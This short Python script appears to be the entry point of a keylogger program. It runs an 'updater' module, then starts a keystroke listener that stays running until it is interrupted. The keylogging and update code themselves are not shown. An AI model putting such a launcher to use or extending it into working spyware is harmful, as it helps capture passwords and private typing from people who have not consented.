import updater
import keyLogger

if __name__ == "__main__":
    updater.main()
    keyLogger.start_listener()
    try:
        while True:
            pass  # Keep the main thread alive
    except KeyboardInterrupt:
        keyLogger.stop_listener()